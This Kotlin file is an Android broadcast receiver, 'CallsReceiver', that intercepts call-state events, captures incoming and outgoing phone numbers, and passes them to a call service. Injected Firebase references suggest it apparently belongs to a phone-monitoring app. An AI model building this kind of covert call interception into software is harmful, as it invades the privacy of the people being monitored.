package com.dtz.netservice.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.telephony.TelephonyManager
import android.util.Log
import com.dtz.netservice.services.calls.CallsService
import com.dtz.netservice.utils.Consts.COMMAND_TYPE
import com.dtz.netservice.utils.Consts.PHONE_NUMBER
import com.dtz.netservice.utils.Consts.STATE_CALL_END
import com.dtz.netservice.utils.Consts.STATE_CALL_START
import com.dtz.netservice.utils.Consts.STATE_INCOMING_NUMBER
import com.dtz.netservice.utils.Consts.TYPE_CALL
import com.dtz.netservice.utils.Consts.TYPE_CALL_INCOMING
import com.dtz.netservice.utils.Consts.TYPE_CALL_OUTGOING
import com.dtz.netservice.preference.DataSharePreference.typeApp
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.google.firebase.database.DatabaseReference
import com.google.firebase.storage.StorageReference
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 13/03/18.
 */
class CallsReceiver : BroadcastReceiver() {

    private var phoneNumber: String? = null
    private var extraState: String? = null

    @Inject
    lateinit var firebase: InterfaceFirebase

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun getStorageReference(child: String): StorageReference = firebase.getStorageReference(child)

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_NEW_OUTGOING_CALL || intent.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
            phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER)
            extraState = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
            if (!context.typeApp) context.startCallService(intent, context)
        }
    }

    private fun Context.startCallService(intent: Intent, context: Context) {
        if (extraState != null) {
            when (extraState) {
                TelephonyManager.EXTRA_STATE_OFFHOOK -> {
                    setIntentType(STATE_CALL_START)
                }
                TelephonyManager.EXTRA_STATE_IDLE -> {
                    setIntentType(STATE_CALL_END)
                }
                TelephonyManager.EXTRA_STATE_RINGING -> {
                    if (phoneNumber == null) phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                    setIntent(TYPE_CALL_INCOMING)
                }
            }
        } else if (phoneNumber != null) {
            setIntent(TYPE_CALL_OUTGOING)
        }
    }

    private fun Context.setIntentType(type: Int) {
        val myIntent = Intent(this, CallsService::class.java)
        myIntent.putExtra(COMMAND_TYPE, type)
        startService(myIntent)
    }

    private fun Context.setIntent(callType:Int) {
        val myIntent = Intent(this, CallsService::class.java)
        myIntent.putExtra(COMMAND_TYPE, STATE_INCOMING_NUMBER)
        myIntent.putExtra(PHONE_NUMBER, phoneNumber)
        myIntent.putExtra(TYPE_CALL,callType)
        startService(myIntent)
    }

}